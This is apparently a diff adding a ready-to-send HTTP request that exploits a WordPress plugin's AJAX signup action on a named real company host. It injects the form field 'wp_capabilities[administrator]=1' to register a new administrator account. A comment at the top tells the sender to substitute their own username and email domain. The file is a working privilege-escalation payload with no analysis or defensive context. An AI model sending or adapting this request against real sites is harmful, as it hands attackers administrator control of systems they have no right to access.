@@ -1,0 +1,70 @@
+#navreets=randomstring and you can add anything instead of interact.sh
+
+
+
+POST /wp-admin/admin-ajax.php HTTP/1.1
+Host: ca.bentley.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36
+Connection: close
+Content-Length: 1872
+Accept: application/json, text/javascript, */*; q=0.01
+Content-Type: multipart/form-data; boundary=---------------------------138742543134772812001999326589
+Origin: https://ca.bentley.com/
+Referer: https://ca.bentley.com/
+Accept-Encoding: gzip
+
+-----------------------------138742543134772812001999326589
+Content-Disposition: form-data; name="reg_username"
+
+navreets
+-----------------------------138742543134772812001999326589
+Content-Disposition: form-data; name="reg_email"
+
+navreets@interact.sh
+-----------------------------138742543134772812001999326589
+Content-Disposition: form-data; name="reg_password"
+
+navreets@interact.sh
+-----------------------------138742543134772812001999326589
+Content-Disposition: form-data; name="reg_password_present"
+
+true
+-----------------------------138742543134772812001999326589
+Content-Disposition: form-data; name="reg_first_name"
+
+navreets@interact.sh
+-----------------------------138742543134772812001999326589
+Content-Disposition: form-data; name="reg_last_name"
+
+navreets@interact.sh
+-----------------------------138742543134772812001999326589
+Content-Disposition: form-data; name="_wp_http_referer"
+
+/wp/?page_id=18
+-----------------------------138742543134772812001999326589
+Content-Disposition: form-data; name="pp_current_url"
+
+https://ca.bentley.com/
+-----------------------------138742543134772812001999326589
+Content-Disposition: form-data; name="wp_capabilities[administrator]"
+
+1
+-----------------------------138742543134772812001999326589
+Content-Disposition: form-data; name="signup_form_id"
+
+1
+-----------------------------138742543134772812001999326589
+Content-Disposition: form-data; name="signup_referrer_page"
+
+
+-----------------------------138742543134772812001999326589
+Content-Disposition: form-data; name="action"
+
+pp_ajax_signup
+-----------------------------138742543134772812001999326589
+Content-Disposition: form-data; name="melange_id"
+
+
+-----------------------------138742543134772812001999326589--
+
+
